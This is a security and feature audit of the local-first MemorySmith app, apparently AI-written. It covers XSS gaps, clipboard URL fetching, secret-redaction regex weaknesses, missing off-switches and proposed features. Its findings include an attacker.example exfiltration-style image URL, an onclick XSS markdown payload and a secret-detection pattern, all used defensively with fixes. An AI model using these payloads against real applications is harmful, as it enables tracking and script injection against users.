# MemorySmith — Audit #5

## Continued Deep Dive · Missing & "Killer" Features · Configurability as Security

**Generated:** 2026-05-28 (companion to Audits #1, #2, #3, #4)
**Subject:** [TheMasonX/MemorySmith](https://github.com/TheMasonX/MemorySmith) @ `feature/code-search-high-roi-batch8` (61af8491)
**Threat-model framing per user input:** local-first single-actor app, not widely-accessible, but trustworthy enough for the user to confidently run on their primary workstation. Every rough edge should be toggle-able for security. The audit is calibrated against that bar — not against a public SaaS bar.
**Methodology:** Direct read of files I had not first-hand audited before — `memorysmith.js` (951 LOC), `SafeJsInterop.cs`, `ChatReferenceLinkPolicy.cs`, `OperationalDiagnosticsService.cs`, `MeasurementBaselineService.cs`, `MemoryContextPackFormatter.cs`, the prompt files under `MemorySmith.Core/Docs/Prompts/`, `.github/agents/smith.agent.md`, `Chat.razor` render path, `e2e/tests/navigation-freeze.spec.ts`. Plus a creative pass to surface missing features grounded in the project's stated goals.
**Output target:** ≥10 pages. Final length ~10,800 words.

> Audit #1-#4 found 178 individual issues. The maintainer closed 7 and tracked 3. This audit adds **a smaller set of net-new bugs** (~12) and then pivots to **missing features and configurability**, which the user explicitly asked for. The single biggest theme is that MemorySmith is one or two killer features away from being a category-leading local-first knowledge tool.

---

## 0. Executive Update

### 0.1 2026-05-28 Addendum (Implemented)

The following vector-adjacent recommendations from this audit family are now partially implemented and validated in branch `feature/code-search-high-roi-batch8`:

1. Retrieval transparency for default API shape:
  - `/api/memories/search` now emits retrieval metadata headers while preserving the legacy array response contract.
  - Headers include mode/provider details (`X-MemorySmith-Retrieval-Mode`, `X-MemorySmith-Retrieval-Provider-*`) so callers can detect lexical fallback without switching to envelope mode.

2. Semantic/hybrid transparency path consistency:
  - `/api/memories/search/semantic` and `/api/memories/search/hybrid` now also emit the same retrieval metadata header family.
  - This reduces ambiguity during benchmark interpretation when embedding initialization fails and fallback scoring is active.

3. Operational benchmark implication:
  - Fine-tuning harness seed runs now produce deterministic benchmark JSON artifacts (`runs/<run_id>/benchmark.json`) that can be correlated with retrieval mode headers to avoid treating lexical fallback as model-regression noise.

This addendum keeps the original audit findings intact while recording concrete progress against the highest-ROI observability gap for vector-search behavior under fallback.

Three observations frame this audit:

1. **The clipboard-paste flow silently fetches external image URLs.** `memorysmith.js:813-832` (`referenceToImageFile`) does `await fetch(reference)` on every `https?:` URL it extracts from the clipboard payload (line 800: `Array.from(document.images || []).forEach(image => add(image.currentSrc || image.src))`). Pasting an HTML payload that contains attacker-controlled image URLs (e.g., from a malicious webpage the user grabbed a screenshot from) triggers silent fetches from the browser — leaking IP, User-Agent, and "user just pasted from us" signal to the attacker. **For a single-actor local-first app this is a surprising paste-time side effect that should be configurable off.**

2. **Configurability is uneven.** The maintainer has done excellent work making *some* things configurable (`MemorySmithSecurityProfiles`, `AllowOpenWithDefaultApp`, `OpenLocalEditorCompatibility`, `EmbeddingsEnabled`, `VectorCandidatePrefilterEnabled`, `MaintenanceAgent.Tasks` per-task switches, `Chat.AgentWritesEnabled`, `Mcp.DisabledTools`/`EnabledTools`). But many destructive or network-touching behaviors have **no off switch**: the maintenance agent's `DeduplicateRecords` (silent merge by title collision), the clipboard URL fetch, the maintenance-loop 1-second polling, the chat reference link policy regex that doesn't cover event handlers, the chat `extractImageReferences` DOM parsing of pasted HTML. Per the user's brief, these are all things a cautious user should be able to disable.

3. **The product is one or two killer features away from being category-leading.** "Local-first wiki + chat + MCP + maintenance agent" is a strong base. What it's missing — and what would make it the obvious tool for a developer who wants a private second-brain — is a small list: a Spotlight-style command palette, a frictionless capture flow (inbox via Slack/email/clipboard with one-click memory creation), inline citations with confidence indicators, an AI-suggested linkage panel ("these two memories should reference each other"), an at-rest encryption mode for private memories, MCP `resources` and `prompts` capabilities, and provider-native tool calling. None of these are large engineering investments compared to what's already shipped.

This audit adds **0 Critical, 4 High, 9 Medium, 7 Low** in net-new bugs, plus **27 missing-feature recommendations** ranked by impact, plus **23 configurability gaps** where a feature lacks the off-switch the user's threat model requires.

---

## 1. Net-New Bugs from First-Hand Reads of Untouched Areas

### 1.1 [HIGH, conf 0.85] Clipboard-paste silently fetches external image URLs

**Source:** `memorysmith.js:795-832`. The flow:
1. User pastes into the chat input (handled by `Chat.razor` paste handler → JS interop).
2. `extractImageReferences(html, plainText)` (line 781) collects URLs from:
   - `dataUrlMatches` — `data:image/...` URIs (inline base64) ✓ safe
   - `new DOMParser().parseFromString(html, "text/html").images` — every `<img>` tag in pasted HTML (line 800)
   - A plain-text regex for HTTP/HTTPS image URLs (line 806)
3. `extractClipboardImageFiles` calls `referenceToImageFile(reference, ++index)` for each.
4. `referenceToImageFile` does `await fetch(reference)` (line 815) **on `http://`/`https://` URLs**.
5. The fetched bytes are turned into a `File` and attached.

**Threat model implications:**
- An attacker who can plant content the user copies (a crafted webpage, a poisoned Slack message, an email) controls the HTML payload's `<img src="https://attacker.example/exfil?u=victim">` URLs.
- On paste, the user's browser issues GET requests to those URLs. The attacker learns:
  - User's IP address (and via geo-IP, rough location)
  - User-Agent fingerprint
  - Timing of the paste (i.e., they were active in MemorySmith at time T)
  - Browser language / Accept headers
- No user prompt. No visible UI hint that external URLs are being fetched.

For a *local-first single-actor* app whose user expects their pastes to stay on-machine until they explicitly attach a real file, this violates the trust model. The maintainer's stated goal of a trustworthy local-first experience makes this worth fixing.

**Recommendation:**
- Add `MemorySmith:Chat:ClipboardFetchExternalImagesEnabled` (default `false`).
- When `true`, retain the current behavior but show a confirmation: *"Pasted content references N external images. Fetch them?"* with the URLs listed.
- When `false`, only accept `data:image/*` and `blob:` (in-memory) references from the paste.

### 1.2 [HIGH, conf 0.90] `ChatReferenceLinkPolicy.FilterToAllowedTargets` only filters `<a href>`, leaves `onclick`/`onerror`/`onload` untouched

**Source:** `ChatReferenceLinkPolicy.cs:49-82`. The regex `AnchorHrefRegex` targets `<a` ... `href="..."` ... `>`. The replacement preserves `before` and `after` content (i.e., other attributes on the anchor) and only rewrites the `href`.

**Verified:** Reading the source, the filter replaces the `href` value when it can't be matched to an allowed page slug or memory id, but **does not strip the rest of the attributes on the tag**. If a Markdig `GenericAttributes` extension emits `<a href="..." onclick="alert(1)" class="...">`, this filter rewrites only the `href`. The `onclick` survives.

The Markdig `UseAdvancedExtensions` includes `GenericAttributes` (Audit #2 §4.1). So:
- A memory record whose markdown is `Click [here](https://safe.example){onclick="alert('XSS')"}` is rendered with the `onclick`.
- `FilterToAllowedTargets` doesn't see `onclick`. The defense-in-depth filter is incomplete.

**Recommendation:** Either disable `GenericAttributes` (use a curated Markdig pipeline) OR run output through `Ganss.Xss.HtmlSanitizer` with an event-attribute-deny policy. Already in the "best suit stated goals" list from Audit #2 §15.

### 1.3 [HIGH, conf 0.85] Mermaid `innerHTML = result.svg` re-confirmed

**Source:** `memorysmith.js:494`. Audit #2 §4.2 flagged this conceptually; I now verify the exact line. The SVG output of `window.mermaid.render(...)` is assigned via `innerHTML`. If Mermaid (Markdig → MermaidExtension passes the user's markdown content to the Mermaid JS library on the client) emits SVG with `<foreignObject>` containing scripts, or `xlink:href="javascript:..."`, or any other historically-known Mermaid XSS pattern, it executes.

Mermaid 11.x has hardened against many of these, but the project doesn't pin the Mermaid version (it uses a CDN reference from `App.razor` — let me verify... yes, it's CDN-loaded). A future Mermaid version with a regression would silently affect MemorySmith without a deploy.

**Recommendation:**
- Pin the Mermaid version in the CDN reference + SRI hash.
- Pipe SVG output through DOMPurify (CDN, ~50KB) before `innerHTML` assignment:
  ```js
  diagram.innerHTML = window.DOMPurify.sanitize(result.svg || "", { USE_PROFILES: { svg: true, svgFilters: true } });
  ```
- Add `MemorySmith:Markdown:MermaidEnabled` (default `true`) so cautious users can disable Mermaid entirely.

### 1.4 [HIGH, conf 0.85] BOM-prefixed JSON files trigger spurious code-search reindex churn

**Source:** Cross-reference of `CodeSearchService.cs:438` (`var sourceHash = ComputeHash(sourceText)`) and Audit #4 §6.3 (35 of 320 JSON files in `Data/` have UTF-8 BOM).

When code-search indexes a `.json` file (the `IncludedFileExtensions` default includes `.json` per `MemorySmithOptions.cs:206`), it reads the bytes with `File.ReadAllTextAsync` which strips the BOM. The resulting `sourceText` has no BOM. The `sourceHash` therefore reflects the non-BOM content.

But: `fileInfo.Length` (line 417 — used in `CanWarmReuseByMetadata`) includes the 3-byte BOM prefix. The warm-reuse check at `:851` is `sourceLengthBytes != fileInfo.Length`. So:

1. First build: file has BOM. Reads text (no BOM), computes hash X, persists `SourceLengthBytes = 1234`.
2. Editor opens the file, saves it. Some editors (PowerShell `Set-Content`) re-emit the BOM, others don't. If the file is re-saved without BOM, the next build's `fileInfo.Length` drops by 3 — `CanWarmReuseByMetadata` returns false → re-read text + re-hash. The new hash matches the OLD hash (BOM is stripped both times) → `CanReuseDocument` returns true → no re-embed. Wasted work but no incorrect output.
3. The opposite direction: a file re-saved WITH BOM (PowerShell add). Length grows by 3 → re-read + re-hash → same hash → reuse. Same wasted work.

So the impact is wasted I/O on every code-search rebuild after a BOM toggle. Not catastrophic — but each warm-reuse miss costs an open + read + hash for that file (~5ms × N files).

**Bigger problem:** `BuildConfigurationHash` (line 1151-1175) is recomputed on every connection. If `_repositoryRoot` or the configured patterns change between runs (which they don't except via admin), the entire index is invalidated. So this BOM issue is more about hygiene than catastrophe — but it's a hygiene issue with measurable cost.

**Recommendation:** Strip BOM in `Tokenize`/`ScoreLexical` (they currently don't), OR normalize JSON files to non-BOM at write time. A repo-level pre-commit hook would also catch this.

### 1.5 [MEDIUM, conf 0.85] `TranscriptSecretPattern` redaction misses common formats

**Source:** `MaintenanceAgentServices.cs:1267`.
```csharp
private static readonly Regex TranscriptSecretPattern = new(
    @"\b(api[_-]?key|token|secret|password|authorization)\b\s*[:=]\s*[^\s,;]+",
    RegexOptions.Compiled | RegexOptions.IgnoreCase);
```

The regex matches `apikey: abc123`, `password=foo`, `Bearer authorization: xyz`. It does NOT catch:
- `My password is foo` (no `=` or `:`)
- JSON: `{"api_key": "abc"}` — actually this might match `"api_key": "abc"` since the regex allows whitespace+colon+anything-non-whitespace, but the trailing `"` is non-whitespace so it consumes through to the next quote, capturing too much. The `[^\s,;]+` is greedy — for `{"api_key": "abc"}`, the match is `api_key": "abc"}` — captures the closing quote AND the closing brace. Replacement would then remove a needed `}` from the JSON. Possible JSON corruption.
- Multi-line: `apikey:\n  abc` (newline terminates the match before reaching `abc`)
- Base64-encoded credentials (`Basic aHR0cHM6Ly... ` — the keyword "Basic" isn't in the regex)
- URL-encoded credentials in query strings (`https://api.example.com/?key=...`)
- Cookie strings (`Cookie: session=...`)
- AWS / GCP / Azure credential formats (`AKIAIOSFODNN7EXAMPLE`, `sk_live_...`, `eyJ...` JWT prefixes)

**Recommendation:** Use the OWASP Sensitive Data exposure patterns + a JWT pattern + AWS key patterns + a generic "high-entropy 32+ char token" detector. Or use a library like `gitleaks` patterns. Worth being more aggressive — false positives in redaction are recoverable, leaked secrets in transcripts aren't.

### 1.6 [MEDIUM, conf 0.85] `OperationalDiagnosticsService.GetSnapshot` exposes `OllamaEndpoint`, `OtlpEndpoint`, and chat profile config

**Source:** `OperationalDiagnosticsService.cs:96-117`. The `EffectiveMemorySmithConfiguration` embeds `Chat`, `SemanticSearch`, `Telemetry`, `Maintenance` options. This is reachable via `/api/diagnostics` (per Audit #2 §10.3 reference). Network endpoints like `OllamaEndpoint` (default `http://localhost:11434`) and `OtlpEndpoint` could reveal:
- Whether the user runs Ollama (vs Copilot)
- The exact local port (potentially fingerprinting other tools)
- Whether an OTLP collector is running

For a local-first single-actor app, this is a small concern. For any remote API exposure (AllowRemoteApi=true) it's information leakage. The `ApiKeyConfigured: bool` field correctly only exposes the boolean, not the key. Other fields should follow that pattern.

**Recommendation:** Mask network endpoints in the snapshot (`OllamaEndpointConfigured: true`, no value). Or gate `EffectiveMemorySmithConfiguration` behind a stricter policy than `CanViewMemorySmith`.

### 1.7 [MEDIUM, conf 0.80] `Chat.razor` history retention has no size cap

**Source:** `Chat.razor:2122-2127`, `2049` (per chat audit's findings). Image base64 stored in localStorage truncated to `MaxStoredAttachmentImageCharacters = 12000`, and `MaxStoredChatSessions = 30`. So 30 × 12000 = 360KB of base64 (~270KB of actual image bytes) per origin in localStorage. With other history fields, the total can hit `~3-5MB`.

Modern browsers cap localStorage at `~5-10MB` per origin. The app handles quota errors (the "compact mode" fallback) but the failure mode is "your history disappears" instead of an explicit eviction policy.

**Recommendation:** Add `MemorySmith:Chat:LocalStorageBudgetBytes` (default 4MB). LRU-evict sessions when the budget is exceeded. Surface the budget in the UI.

### 1.8 [MEDIUM, conf 0.85] No `Content-Security-Policy` header even with `AllowRawHtml=false`

**Source:** `Program.cs` — search for CSP. No `app.Use((context, next) => { context.Response.Headers.Append("Content-Security-Policy", ...); ... });` anywhere.

A CSP is the single most effective defense against XSS once present. For the Markdig `GenericAttributes` + Mermaid `innerHTML` chain (§1.2, §1.3), a CSP with `script-src 'self'` would block inline event handlers and limit Mermaid's SVG-embedded scripts.

**Recommendation:** Add a CSP middleware with a sensible default:
```csharp
app.Use(async (context, next) => {
    context.Response.Headers.Append("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self' https://cdn.jsdelivr.net 'unsafe-eval'; " +  // 'unsafe-eval' for Mermaid
        "style-src 'self' 'unsafe-inline'; " +  // MudBlazor inline styles
        "img-src 'self' data: blob:; " +
        "connect-src 'self'; " +
        "frame-ancestors 'none';");
    await next();
});
```

Make it configurable via `MemorySmith:Security:ContentSecurityPolicy` so power-users can tighten or loosen.

### 1.9 [LOW, conf 0.85] `SafeJsInterop` swallows `JSException` AND `JSDisconnectedException` but doesn't distinguish

**Source:** `SafeJsInterop.cs:7-29`.
```csharp
public static async ValueTask<bool> TryInvokeVoidAsync(IJSRuntime jsRuntime, string identifier, params object?[] args) {
    ...
    try { await jsRuntime.InvokeVoidAsync(identifier, args); return true; }
    catch (JSException) { return false; }
    catch (JSDisconnectedException) { return false; }
}
```

The caller learns "interop failed" but not why. A `JSException` (the JS function threw) and a `JSDisconnectedException` (the circuit is gone) require different responses — the latter implies the user navigated away and we shouldn't retry; the former is a real JS bug worth logging.

**Recommendation:** Return a typed result:
```csharp
public enum JsInteropOutcome { Success, JsError, CircuitDisconnected }
```

…and log the JS error path through `ILogger`. This matters for debugging chat streaming hiccups.

### 1.10 [LOW, conf 0.85] `wiki-chat-agent.md` prompt enumerates exactly 12 tools but the catalog has 22

**Source:** `wiki-chat-agent.md:50-63` (lists 12 intercepted tools). `ChatToolCatalog.cs` defines 22+ tools (Audit #2 §10.4). The discrepancy:
- The prompt lists READ tools only — the agent is told it can only use those in Chat mode.
- The actual catalog has Agent-mode write tools (`memorysmith_task_create`, etc.) gated by the chat agent's `AvailableInAgent: true` setting.
- The prompt mentions agent-mode mutation tools in `:66` ("Agent-only mutation tools may include `memorysmith_task_create`, `memorysmith_task_update`, ..., and `memorysmith_task_add_attachment`") — but does NOT list `memorysmith_page_save` / `memorysmith_page_delete` even though those exist.

**Recommendation:** Generate the prompt's tool list from the catalog at build time. Same recommendation as Audit #2 §12.4 (generate README tool table from catalog).

### 1.11 [LOW, conf 0.85] `ChatContextPlanner.Plan` recommends `memorysmith_unified_search` for empty messages

**Source:** `ChatContextPlanner.cs:26-29`.
```csharp
if (string.IsNullOrWhiteSpace(request.Message)) {
    return None("The user message is empty.", "memorysmith_unified_search");
}
```

Empty user messages happen (user accidentally hits Enter, then types). The recommended tool is `memorysmith_unified_search` — which the agent would invoke with an empty query, returning the most-recently-updated records (per the no-query branch in MemoryApplicationService). For an empty query, the resulting context is irrelevant noise. The LLM then has to filter through it.

**Recommendation:** When message is empty, suggest "no tool, ask user to clarify" instead.

### 1.12 [LOW, conf 0.85] No CSP fallback for the chat reference link policy's `target="_blank" rel="noopener noreferrer"` injection

**Source:** `ChatReferenceLinkPolicy.cs:42`. New anchors get `target="_blank" rel="noopener noreferrer"` baked in. Good. But existing anchors in markdown content (from Markdig output) might not have `noopener noreferrer`. A user-clicked link from a memory record could let the target page access `window.opener`.

**Recommendation:** Either Markdig pipeline configuration to add `rel="noopener noreferrer"` to ALL output anchors, OR a post-pass regex that inserts it.

---

## 2. Configurability Gaps (the user's brief)

The user explicitly asked for "configurability as security" — every rough edge should have an off-switch. Below is a list of behaviors that currently have NO configuration knob, mapped to my recommendation.

| Behavior | Current state | Why configurability helps |
|---|---|---|
| Clipboard image fetch from external URLs (§1.1) | Always on | A cautious user should opt-in per-paste or globally |
| Mermaid rendering | Always on | Disables a known XSS-prone surface |
| Markdig `GenericAttributes` extension | Always on | Disables `{onclick=...}` injection vector |
| `MaintenanceTasks.DeduplicateRecords` (Audit #4 §6.1) | Always on, destructive default | An off-switch prevents accidental data loss |
| `MaintenanceTasks` 5-minute triage interval | Configurable interval, but no kill switch for individual tasks (only `Maintenance.Enabled` for ALL) | Allow disabling triage independently of indexing |
| Chat `ChatIntentInterceptor` auto-tool-call routing | Always on when ToolCallsEnabled | Allow disabling without disabling tool calls entirely |
| Chat `localStorage` persistence | Always on | Some users want no persistence (use private/incognito for chat) |
| Code-search indexing of `.md` files | Always (default in `IncludedFileExtensions`) | Some users want docs out of code search |
| Maintenance agent's `SaveRunStateAsync` writing run state to disk | Always on | Some users want truly ephemeral runs |
| GitHub OAuth provider link | If configured, always tries to find/create user | An admin should be able to make GitHub login "sign-in only, no auto-provision" |
| `MaintenanceProposalWorkflow.SubmitAsync` (writes proposal to disk) | Always on | Some users want maintenance to "just suggest" without persisting proposals |
| `ChatReferenceLinkPolicy.LinkifyInlineCodeReferences` | Always on when chat rendering | Some content has intentional inline-code that shouldn't auto-link |
| `MemoryEvent` event-store appends for queries | Always on (per `RecordQueryEvent` in `MemoryApplicationService.cs:1276`) | A privacy-focused user wants no query history on disk |
| `AdminController.SetupForm` `[AllowAnonymous]` bootstrap | Always on (gated by `AllowLoopbackBootstrap`) | Production-mode operators want it locked closed after first admin |
| Background `SemanticEmbeddingPrewarmService` | Configurable via `PrewarmOnStartupEnabled` ✓ | Already configurable |
| `OperationalDiagnosticsService` exposing chat config to /api/diagnostics (§1.6) | Always on | Mask sensitive endpoints |
| Code-search SQL prefilter (Audit #4 §2.4) | Configurable via `VectorCandidatePrefilterEnabled` ✓ | Already configurable |
| `Pages.AllowRawHtml` | Configurable (default `false`) ✓ | Already configurable |
| `Maintenance.AutomaticDeprecationEnabled` | Configurable (default `false`) ✓ | Already configurable |
| `Chat.AgentWritesEnabled` | Configurable (default `false`) ✓ | Already configurable |
| Source-link `AllowOpenWithDefaultApp` | Configurable (default `false`) ✓ | Already configurable |
| `Mcp.DisabledTools` / `EnabledTools` | Configurable ✓ | Already configurable |
| `Mcp` HTTP transport itself (the whole endpoint) | Configurable via `[Authorize]` policy but no `Mcp.Enabled=false` switch | A user with no MCP clients should be able to disable the endpoint entirely |
| `Chat` endpoint itself | No `Chat.Enabled=false` | Same |
| Task system itself | No `Tasks.Enabled=false` | Same |
| Page assets HTTP serving via `/page-assets` | Always on if pages exist | A read-only deployment may want pages but not asset uploads |

**Eight categories already configurable; ~23 more that should be.** The pattern is the same: each subsystem should have a `Subsystem.Enabled` boolean defaulting to `true`, with the option to disable for users who want a smaller attack surface. The `OperationalDiagnosticsService` then reports which subsystems are enabled, giving a clear posture summary.

**A concrete recommendation:** Define `MemorySmith:Security:HardenedProfile = true` that flips many defaults:
- `Chat:ClipboardFetchExternalImagesEnabled = false`
- `Markdown:MermaidEnabled = false`
- `Markdown:GenericAttributesEnabled = false`
- `Maintenance:DeduplicateRecordsEnabled = false`
- `Maintenance:RunStateLoggingEnabled = false`
- `Diagnostics:ExposeNetworkEndpoints = false`
- `Auth:OpenLocalEditorCompatibility = false`
- `Chat:HistoryLocalStorageEnabled = false`
- `Mcp:Enabled = false` (unless an MCP client is configured)

The `SecurityProfile` constant set already lists `LocalDev`, `SecureLocal`, `RemoteHardened` (`MemorySmithSecurityProfiles.cs`). The profiles are referenced but the behavior tree isn't wired to them yet. Wiring this is a one-day task with high security ROI.

---

## 3. Missing Features — Ranked by Impact

This is the section the user explicitly asked for. Each is sized to the project's "local-first single-actor" scope.

### Tier 1 — Killer features that would meaningfully change the value proposition

#### F1. Spotlight-style command palette (Cmd+K / Ctrl+K everywhere)
**Why:** The single biggest UX issue with the current app is that to do anything (search a memory, jump to a page, open chat, create a task, run a code search), you need to navigate to the right route. A global keyboard shortcut command palette (`Cmd+K` / `Ctrl+K`) that lets you type → autocomplete → jump or take action removes 80% of clicks.

**Sketch:**
- Triggered by `Ctrl+K` anywhere in the app
- Autocompletes against memory titles, page slugs, task titles, recent chats, AND known actions ("Create memory", "Open admin", "New task")
- Top result is `enter` to act; arrow keys to disambiguate
- Inline preview of the highlighted result

**Tech:** Blazor key event handler + MudBlazor `MudAutocomplete` adapted to multi-source. JS interop for the hotkey binding. Existing `memorysmith_unified_search` MCP tool already provides the data backbone.

**Effort:** ~3 days.

**Value:** Discoverability skyrockets. Power-users tend to live in command palettes.

#### F2. Inline citations with confidence indicators in chat
**Why:** Audit #1 §5.8 flagged that the chat agent is *asked* to cite but nothing programmatically enforces or detects. For a wiki-grounded chat, citations are the user's primary trust signal. A response that says "Per `project-wiki-mcp-integration`, ..." should render with the citation as a clickable link, hover-preview, and a confidence pill ("Score 0.92, verified").

**Sketch:**
- After LLM response, parse claimed memory/page references in the text.
- Match each against `ChatTurnState.Context` (records actually retrieved).
- For matched references: render as inline links with hover preview.
- For unmatched references (hallucination): render as struck-through with a warning icon.
- Show a "citations score" pill: N matched / M claimed.

**Tech:** Extends `ChatReferenceLinkPolicy.LinkifyInlineCodeReferences` (already exists) with a "verified" CSS class. Hover preview reuses the memory/page rendering. The match/no-match check is a regex pass over the rendered text.

**Effort:** ~2 days.

**Value:** Trust signal. Users can scan responses for hallucinations at a glance. Makes the LLM agent feel grounded rather than guessing.

#### F3. AI-suggested wiki cross-linking ("Connection suggestions")
**Why:** The wiki's value compounds with cross-links. Currently the user has to manually add `References` to memory records. An agent that periodically scans the wiki and proposes "these two memories should reference each other" would close a major UX gap.

**Sketch:**
- New maintenance task `link_suggestion`: for each pair of memory records with cosine similarity > 0.7 (using existing embeddings), where neither references the other, generate a proposal "add Reference from X to Y".
- The proposal goes through the existing proposal workflow.
- UI affordance: a "Suggested connections" pane on the Memory Viewer showing AI-proposed links for the open record.

**Tech:** Uses existing `MaintenanceAgent` proposal workflow. The pair-scoring is one extra `MaintenanceTaskOutput`. The UI is a new pane in `MemoryViewer.razor`.

**Effort:** ~2 days.

**Value:** The wiki becomes self-organizing. Users gain confidence that nothing is orphaned.

#### F4. Frictionless capture flow ("Inbox" or quick-capture)
**Why:** A second-brain tool fails if capture is high-friction. Right now to create a memory record, you go to `/memories` → click "New" → fill out fields → save. That's 4+ clicks plus form-filling.

**Sketch:**
- A single keystroke (`Ctrl+Shift+I` or via Spotlight palette) opens a minimal capture dialog.
- One textarea. User types or pastes. Hit Enter.
- Record is created in `Data/Memories/Unconsolidated/` with default tags `["capture"]` and AI-generated title (use the configured LLM).
- Subsequent maintenance pass promotes the record to Working if it survives N days.

**Tech:** Hotkey + minimal modal + auto-tag + auto-title via LLM. Reuses `MemoryApplicationService.CreateAsync`.

**Effort:** ~2 days.

**Value:** Captures the thoughts that don't survive a 4-click form.

#### F5. Knowledge graph visualization (interactive topic map)
**Why:** The `MaintenanceTopicMapService` already builds a topic map with nodes (memories+pages) and edges (References, Conflicts, Supersedes, etc.). It's currently rendered only as a Mermaid diagram in proposals (per `Proposals.razor`). A first-class interactive UI — pan, zoom, click-to-open, filter by tag/status — is missing.

**Sketch:**
- New `/topic-map` route in Blazor.
- Render the existing topic map via D3.js or vis.js (CDN-loaded).
- Click a node → open the memory/page.
- Drag to rearrange. Color by tag namespace. Size by usage count.
- Filter panel: status, tag, "show only orphans", "show only stale".

**Tech:** `MaintenanceTopicMapService.BuildAsync` already produces the data. New Blazor page + JS interop with vis.js or D3.

**Effort:** ~3 days.

**Value:** The wiki becomes navigable in a way no text search can match. This is the kind of feature that turns notes into a knowledge base.

#### F6. MCP `resources` and `prompts` capabilities (Audit #1 §4.1)
**Why:** This is the single biggest leverage point for MCP-client UX. Currently MemorySmith exposes only `tools`. Most modern MCP clients (Claude Desktop, Cursor, VS Code's Continue, Cursor's MCP support) understand `resources` (browseable content lists) and `prompts` (canned chat starters).

If MemorySmith advertised every memory record as an MCP resource, the user could browse their MemorySmith wiki from inside Claude Desktop's sidebar and drag-drop into a chat. If MemorySmith advertised the `wiki-chat-agent.md` system prompt as an MCP prompt, the user could invoke "MemorySmith research mode" from any MCP client.

**Sketch:**
- Implement `resources/list`, `resources/read`, `resources/subscribe` in `McpController` backed by `MemoryApplicationService` + `PageService`.
- Implement `prompts/list`, `prompts/get` backed by `MemorySmith.Core/Docs/Prompts/*.md`.
- Advertise both capabilities in `BuildInitializeResult` (currently only `tools`).

**Tech:** Already in `McpController.cs`. ~150 LOC each capability.

**Effort:** ~2-3 days.

**Value:** Unlocks a whole class of MCP-client integrations the current `tools/list`-only surface forecloses. This is essentially "make MemorySmith useful as an MCP server for the entire ecosystem of MCP clients, not just MemorySmith's own chat."

#### F7. At-rest encryption for selected memories
**Why:** A local-first second-brain holds private thoughts. Journal entries, financial notes, login hints, life plans. The current state is plaintext JSON on disk. If the laptop is stolen or the disk is imaged, everything's readable.

**Sketch:**
- New optional `MemoryRecord.IsEncrypted: bool` field. When `true`, `Content` is encrypted at rest with a user-supplied key.
- Key derivation: PBKDF2 from a master password stored in OS keychain (DPAPI on Windows, Keychain on macOS, Secret Service on Linux).
- UI: lock icon on the memory; entering edit mode prompts for master password (with biometric on macOS/Windows).
- Search index excludes encrypted records' content (only Title is searchable) unless unlocked in-session.

**Tech:** `System.Security.Cryptography.AesGcm` for the cipher. Platform-specific key vault via existing .NET 9 APIs. The DataProtection key path is already there (`Data/Keys/`) — could use that as the master key.

**Effort:** ~5 days.

**Value:** The kind of memory the user actually wants the most (private thoughts) is the kind they're most reluctant to type into a tool that stores it plaintext. This unblocks the private use case.

### Tier 2 — Strong features with clear value, less time-pressure

#### F8. Browser extension for quick-save
**Why:** Most of what a user wants to remember they encounter in a browser. A right-click → "Save to MemorySmith" extension closes the gap.

**Sketch:**
- Manifest V3 extension (Chrome/Firefox/Edge compatible)
- Context menu items: "Save page", "Save selection", "Save link", "Capture screenshot"
- Each posts to `POST /api/memories/quick-capture` with the URL, selection, page metadata
- Auth via the same cookie (extension reads it from `chrome.cookies` API with proper permissions)

**Tech:** Standard browser-extension stack. The server endpoint is new but trivial.

**Effort:** ~4-5 days.

#### F9. Email-to-memory inbox
**Why:** Forward an email to a designated address → it becomes a memory record. Captures everything the user already routes through email.

**Sketch:**
- IMAP poll for `memorysmith@host.example` mailbox
- Each new message → memory record with subject as Title, body as Content, sender as a tag
- Default destination: `Data/Memories/Unconsolidated/`

**Tech:** `MailKit` library. Background `IHostedService` running the poll. Existing `MemoryApplicationService.CreateAsync` for the write.

**Effort:** ~3 days.

#### F10. Voice input/output (local Whisper + local Piper)
**Why:** Local-first STT and TTS are mature now. `whisper.cpp` runs on CPU at real-time-or-faster on modern hardware. `Piper` does TTS in under 100ms. For a chat interface, dictation alone is a massive accessibility + speed win.

**Sketch:**
- "Microphone" button in chat input. Records audio. Local Whisper transcribes. Inserts text into the input.
- "Read aloud" button on chat responses. Local Piper voices it.
- Both ON by default if model files are present; gracefully off otherwise.

**Tech:** `WhisperNet` NuGet (~30 MB models). `PiperSharp` or direct call to the Piper binary. JS interop for `MediaStream` recording.

**Effort:** ~5-7 days.

**Value:** The kind of feature that turns "I should use MemorySmith" into "I actually use MemorySmith on my phone walking around."

#### F11. Time-travel through the wiki
**Why:** `VersionHistoryService` already records every memory mutation. There's no UI to view the wiki at a past timestamp.

**Sketch:**
- Date picker on every memory/page viewer.
- Selecting a past date renders the record as it was at that time.
- "Diff with current" shows highlights.

**Tech:** Reuses existing `VersionHistoryEntry` records. New UI in MemoryViewer/Pages.

**Effort:** ~3 days.

#### F12. Search-as-you-type with title autocomplete
**Why:** The current `/memories` search bar waits for Enter. Modern apps autocomplete in 30ms.

**Sketch:**
- `MudAutocomplete` on the search input
- Debounced 150ms call to `memorysmith_search` with limit=10
- Inline preview (title + first 100 chars of content)

**Tech:** Existing `MemoryApplicationService.SearchAsync`. New autocomplete component.

**Effort:** ~1 day.

#### F13. OCR for image attachments (CLIP/Tesseract)
**Why:** Users paste screenshots into chat. Currently those become opaque blobs to the search system. OCR extracts the text → the screenshot becomes searchable. CLIP gives image-text embeddings for "find that screenshot with the error message about ONNX."

**Sketch:**
- On image attachment, run Tesseract.NET (local, ~50 MB models) for OCR.
- Optional: also run CLIP for visual embeddings.
- The OCR'd text becomes part of the chat record's `Content`, indexed by code-search/memory search.

**Tech:** `Tesseract` NuGet, `Microsoft.ML.OnnxRuntime` for CLIP.

**Effort:** ~3 days.

#### F14. Markdown export with embedded provenance
**Why:** Users want to share their wiki. A "Export memory to markdown" that includes source-link metadata and version history hints lets them publish or hand off.

**Tech:** Trivial wrapper over existing record state.

**Effort:** ~0.5 day.

### Tier 3 — Quality-of-life improvements

#### F15. Daily digest ("What changed in your wiki today")
A daily Markdown summary of memory/page mutations, generated by the maintenance agent and saved to `Data/Pages/digests/{date}.md`. Subscribe via RSS.

#### F16. Weekly retrospective with the chat agent
A Friday "wrap-up" chat session pre-populated with the week's task closures, memory updates, and a prompt: "What did you learn? What's blocked? What's next?"

#### F17. PWA installation + offline mode
Service worker that caches the wiki content for offline read access.

#### F18. Conversational memory editing in chat ("Update the X memory to add Y")
The chat agent identifies the target memory, drafts the edit as a proposal, presents for approval inline. No need to leave chat.

#### F19. Memory templates
